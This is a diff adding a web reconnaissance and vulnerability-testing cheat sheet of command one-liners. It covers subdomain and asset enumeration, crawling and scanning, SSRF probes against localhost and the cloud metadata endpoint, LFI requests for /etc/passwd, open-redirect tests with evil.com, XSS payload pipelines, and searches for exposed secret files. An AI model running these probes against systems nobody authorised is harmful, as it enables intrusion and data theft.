@@ -1,0 +1,491 @@
+Automated Enumeration
+Subfinder
+subfinder -d example.com -all -recursive -o subfinder.txt
+Fast subdomain discovery using multiple data sources
+
+Assetfinder
+assetfinder --subs-only example.com > assetfinder.txt
+
+Find domains and subdomains associated with a given domain
+
+Sublist3r
+sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt
+Subdomain enumeration using OSINT techniques
+
+Amass
+amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt
+In-depth attack surface mapping and external asset discovery
+
+Chaos Dataset
+subfinder -d example.com -all -sources chaos -o chaos_subs.txt
+Pull subdomains directly from ProjectDiscovery's Chaos data set
+
+GitHub Subdomain Mining
+github-subdomains -d example.com -o github_subs.txt -s
+Enumerate subdomains exposed in public GitHub repositories
+
+Public Sources
+Certificate Transparency
+curl -s https://crt.sh\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >crtsh.txt
+Find subdomains from SSL certificate transparency logs
+
+Wayback Machine
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
+Historical subdomain discovery from web archives
+
+Subdomain Processing
+Merge & Deduplicate
+cat *.txt | sort -u > final.txt
+
+Combine and remove duplicate subdomains
+
+FFUF Subdomain Bruteforce
+ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302
+
+Brute force subdomain discovery using wordlists
+
+Subdomain Permutation
+subfinder -d example.com | alterx | dnsx
+
+Generate subdomain permutations and resolve them
+
+Alterx Enrichment
+echo example.com | alterx -enrich | dnsx
+
+Enrich domain with common patterns
+
+Alterx with Wordlist
+echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
+
+Use wordlist for subdomain permutation
+
+DNSX Resolution
+dnsx -l final.txt -a -resp -r -o resolved_subdomains.txt
+
+Resolve subdomains, capture A records, and list responsive hosts
+
+MapCIDR Expansion
+mapcidr -l resolved_subdomains.txt -silent -o expanded_cidr_hosts.txt
+
+Expand CIDR notations from resolved hosts to discover adjacent IP space
+
+ASN & IP Discovery
+ASN Mapping
+ASN Discovery
+asnmap -d example.com | dnsx -silent -resp-only
+
+Discover IP addresses associated with domain's ASN
+
+Amass Intel by Organization
+amass intel -org "organization_name"
+
+Discover assets by organization name
+
+Amass Intel by CIDR
+amass intel -active -cidr 159.69.129.82/32
+
+Discover assets within IP range
+
+Amass Intel by ASN
+amass intel -active -asn [asnno]
+
+Discover assets by ASN number
+
+Shodan Organization Sweep
+shodan search 'org:"Example Corp"' --fields ip_str,port,hostnames --limit 1000 | sort -u > shodan_org_assets.txt
+
+Enumerate publicly exposed infrastructure tied to an organization via Shodan
+
+IP Harvesting
+VirusTotal IP Lookup
+curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+Extract IP addresses from VirusTotal
+
+AlienVault OTX
+curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+Get IP addresses from AlienVault OTX
+
+URLScan.io
+curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+Extract IP addresses from URLScan.io
+
+Shodan SSL Search
+shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
+
+Find IP addresses using Shodan SSL certificate search
+
+SecurityTrails API
+curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains?apikey=$ST_API_KEY&children_only=true" | jq -r '.subdomains[]' | sed 's/$/.example.com/' > securitytrails_subs.txt
+
+Harvest subdomains and associated IPs from the SecurityTrails API
+
+Live Host Discovery
+HTTP Probing
+HTTPX Basic
+cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+Probe for live hosts on multiple ports
+
+HTTPX with Status Codes
+cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200
+
+Probe with detailed information extraction
+
+Naabu Port Sweep
+cat subdomain.txt | naabu -top-ports 100 -rate 2000 -verify -o naabu_open_ports.txt
+
+Identify open ports quickly across discovered hosts using ProjectDiscovery's Naabu
+
+Visual Recon
+Aquatone Basic
+cat hosts.txt | aquatone
+
+Take screenshots of live hosts
+
+Aquatone Custom Ports
+cat hosts.txt | aquatone -ports 80,443,8000,8080,8443
+
+Screenshot with custom port list
+
+Aquatone Extended Ports
+cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
+
+Screenshot with extended port range
+
+Gowitness Capture
+gowitness file --targets hosts.txt --threads 5 --timeout 10s --destination gowitness_report
+
+Capture browser previews and structured reports using Gowitness
+
+URL Collection & Analysis
+Active Crawling
+Katana
+katana -u livesubdomains.txt -d 2 -o urls.txt
+
+Fast web crawler for URL discovery
+
+Hakrawler
+cat urls.txt | hakrawler -u > urls3.txt
+
+Simple, fast web crawler
+
+Passive Crawling
+GAU (Get All URLs)
+cat livesubdomains.txt | gau | sort -u > urls2.txt
+
+Fetch known URLs from AlienVault's OTX, Wayback Machine, and Common Crawl
+
+URLFinder
+urlfinder -d example.com | sort -u > urls3.txt
+
+Find URLs from various sources
+
+GAU with Status Filter
+echo example.com | gau --mc 200 | urldedupe > urls.txt
+
+Get URLs with 200 status code and deduplicate
+
+Waybackurls Harvest
+cat livesubdomains.txt | waybackurls | sort -u > archived_urls.txt
+
+Collect archived URLs from Wayback Machine and Common Crawl for resurfacing hidden endpoints
+
+Parameter Extraction
+Extract URLs with Parameters
+cat allurls.txt | grep '=' | urldedupe | tee output.txt
+
+Extract URLs containing parameters
+
+Parameter Pattern Matching
+cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt
+
+Extract URLs with parameter patterns
+
+GF SQLi Pattern
+cat allurls.txt | gf sqli
+
+Filter URLs potentially vulnerable to SQL injection
+
+Uro Normalization
+cat allurls.txt | uro --unique --format | sort -u > normalized_urls.txt
+
+Normalize, deduplicate, and canonically format URLs before fuzzing
+
+Vulnerability Scanning
+Nuclei Templates
+Nuclei Single Target
+nuclei -u https://example.com -bs 50 -c 30
+
+Run Nuclei templates against single target
+
+Nuclei Multiple Targets
+nuclei -l live_domains.txt -bs 50 -c 30
+
+Run Nuclei templates against multiple targets
+
+Nuclei with Specific Severity
+nuclei -l live_domains.txt -s critical,high -bs 50 -c 30
+
+Run only critical and high severity templates
+
+Nuclei Custom Templates
+nuclei -l live_domains.txt -t ~/nuclei-templates/custom/ -pt http -c 50 -rl 250
+
+Run curated custom templates with tuned concurrency and rate limits
+
+Sensitive File Discovery
+File Extension Filtering
+Basic Sensitive Files
+cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
+
+Filter URLs for common sensitive file extensions
+
+Extended Sensitive Files
+cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
+
+Extended regex for sensitive file discovery
+
+Google Dork for Files
+site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+
+Google search for sensitive files
+
+Hidden Parameter Discovery
+Arjun Parameter Discovery
+Arjun Passive Discovery
+arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
+
+Passive parameter discovery using Arjun
+
+Arjun Active Discovery
+arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
+
+Active parameter discovery with wordlist
+
+Directory & File Bruteforcing
+Dirsearch
+Dirsearch Basic
+dirsearch -u https://example.com --full-url --deep-recursive -r
+
+Basic directory and file discovery
+
+Dirsearch Extended
+dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
+
+Extended directory bruteforcing with multiple extensions
+
+FFUF
+FFUF Directory Discovery
+ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -t 10
+
+FFUF directory discovery with recursion and multiple extensions
+
+WordPress Security Testing
+WPScan
+WPScan Full Enumeration
+wpscan --url https://example.com --disable-tls-checks --api-token YOUR_API_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+
+Comprehensive WordPress security scan with aggressive plugin detection
+
+CORS Testing
+Manual CORS Testing
+CORS Test with Curl
+curl -H "Origin: http://example.com" -I https://example.com/wp-json/
+
+Test CORS configuration with custom origin
+
+Detailed CORS Analysis
+curl -H "Origin: http://example.com" -I https://example.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"
+
+Analyze CORS headers in response
+
+Automated CORS Testing
+Nuclei CORS Test
+cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
+
+Automated CORS vulnerability scanning with Nuclei
+
+Subdomain Takeover
+Subzy
+Subdomain Takeover Detection
+subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+
+Automated subdomain takeover detection with SSL verification
+
+Git Repository Disclosure
+Git Exposure Detection
+Git Directory Discovery
+cat domains.txt | grep "SUCCESS" | gf urls | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
+
+Detect exposed .git directories and directory listings
+
+SSRF Testing
+SSRF Parameter Discovery
+Find SSRF Parameters
+cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
+
+Identify URLs with SSRF-prone parameters
+
+Find API/Webhook Patterns
+cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u
+
+Find API endpoints and webhook integrations
+
+SSRF Testing
+Nuclei SSRF Scan
+cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
+
+Automated SSRF vulnerability scanning
+
+Basic SSRF Test
+curl "https://example.com/page?url=http://127.0.0.1:80/"
+
+Basic SSRF test to localhost
+
+Cloud Metadata SSRF
+curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
+
+Test SSRF against cloud metadata services
+
+Open Redirect Testing
+Parameter Discovery
+Find Redirect Parameters
+cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=" | tee redirect_params.txt
+
+Extract URLs with redirect parameters
+
+GF Redirect Pattern
+cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt
+
+Use GF patterns to find redirect parameters
+
+Testing
+Basic Open Redirect Test
+cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
+
+Test redirect parameters with evil.com
+
+Comprehensive Redirect Test
+subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
+
+Full pipeline for open redirect testing
+
+Comprehensive Redirect Test 2
+subfinder -d "vulnweb.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | match -r "OREDIR" -m '/home/haxshadow/match/redirect.txt' -d -o ready_urls.txt;or -f ready_urls.txt -pl "OREDIR" -p '/home/haxshadow/payload/Open-Redirect/or.txt' -o Open_redirect_found.txt
+
+Full pipeline for open redirect testing
+
+LFI Testing
+LFI Discovery
+Basic LFI Test
+echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
+
+LFI testing with FFUF and passwd file detection
+
+LFI with Curl
+gau example.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+LFI testing with curl and parallel processing
+
+HTTPx LFI Test
+echo 'https://example.com/index.php?page=' | httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
+
+LFI testing with httpx
+
+XSS Testing
+XSS Discovery
+Reflected XSS for Multiple Payload
+subfinder -d "example.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew | rc -p "RXSS" -o rxss.txt;cxss -f rxss.txt -p "RXSS" -i "FUZZ" -s | grep -E "Unfiltered\(([2-9]|1[0-4])\):" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew>xss_unfilter.txt;xsser -f xss_unfilter.txt -p /home/haxshadow/Xss-payload/xss-hax.txt  -pl "FUZZ" -o Rxss_found.txt
+
+Comprehensive reflected XSS testing with multiple payloads
+
+Blind XSS Oneliners
+subfinder -d "vulnweb.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew>bxss.txt;xsser -f bxss.txt -p /home/haxshadow/Xss-payload/blindXss.txt
+
+Blind XSS testing with specialized payloads
+
+RXSS/BXSS Both finder
+sudo mkdir -p --mode=777 all_xss/example.com/RXSS_BXSS;urlfinder -d "example.com" -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew>all_xss/example.com/RXSS_BXSS/all_urls.txt;cat all_xss/example.com/RXSS_BXSS/all_urls.txt | grep -aE '\?.*=.*(&.*)?' | awk -F'[?&=]' '!seen[$1$2]++' | pvreplace -silent -fuzzing-type postfix | anew | tee all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt;cat all_xss/example.com/RXSS_BXSS/all_urls.txt | grep -aiE "contact|support|chatbot|ticket|comment|feedback|forms|surveys|forums|help|login|registration|register|signin|signup" | httpx -mc 200,302 -timeout 5 -duc -nc | anew | tee all_xss/example.com/RXSS_BXSS/blind_xss_pages.txt;cat all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt | grep -a "FUZZ" | sed 's/FUZZ//g' | httpx -mc 200 -timeout 5 -duc -nc | rc -p "RXSS" -o all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt;cat all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt | cxss -p "RXSS" -i "FUZZ" | grep -E "Unfiltered\(([1-9]|1[0-4])\): \[[\"'<>\$|\(\)\`:;{} ]{2,}\]" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew | tee all_xss/example.com/RXSS_BXSS/reflected_unfilter_xss_parameters.txt
+
+Comprehensive RXSS and BXSS detection pipeline
+
+Additional Tools
+Content Type Filtering
+HTML Content Filtering
+echo example.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
+
+Filter HTML content from discovered URLs
+
+JavaScript Content Filtering
+echo example.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+
+Filter JavaScript files from discovered URLs
+
+Miscellaneous
+Extract IP Addresses
+grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file.txt
+
+Extract IP addresses from text files
+
+Process Amass Output
+cat domains.txt | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > amass.txt
+
+Process Amass output to extract clean domains
+
+Filter Dynamic Files
+cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
+
+Filter URLs for dynamic files with parameters
+
+Clean Parameters
+cat output.txt | sed 's/=.*/=/' > final.txt
+
+Clean parameter values from URLs
+
+URO Deduplication
+cat urls.txt | uro | sort -u > deduplicated_urls.txt
+
+Remove duplicate URLs using URO
+
+QSReplace Parameter Testing
+cat urls.txt | qsreplace "FUZZ" | sort -u > fuzz_urls.txt
+
+Replace parameter values with FUZZ for testing
+
+Tool Installation Guide
+Install Essential Tools
+Install OR (Open Redirect Tester)
+go install -v github.com/h6nt3r/or@latest
+
+Open redirect vulnerability testing tool
+
+Install Match
+cd /opt/ && sudo git clone https://github.com/h6nt3r/matcher.git
+cd
+sudo chmod +x /opt/matcher/match.py
+sudo ln -sf /opt/matcher/match.py /usr/local/bin/match
+match -h
+
+Pattern matching and URL filtering tool
+
+Install Naabu
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+
+Fast port scanning utility to feed alive services into downstream recon tools
+
+Install RC (Reflected Cross-Site Scripting)
+go install -v github.com/h6nt3r/rc@latest
+
+Reflected XSS testing tool
+
+Install CXSS (Contextual XSS Scanner)
+go install github.com/haxshadow/cxss@latest
+
+Contextual XSS vulnerability scanner
+
+Install XSSER
+go install -v github.com/h6nt3r/xsser@latest
+
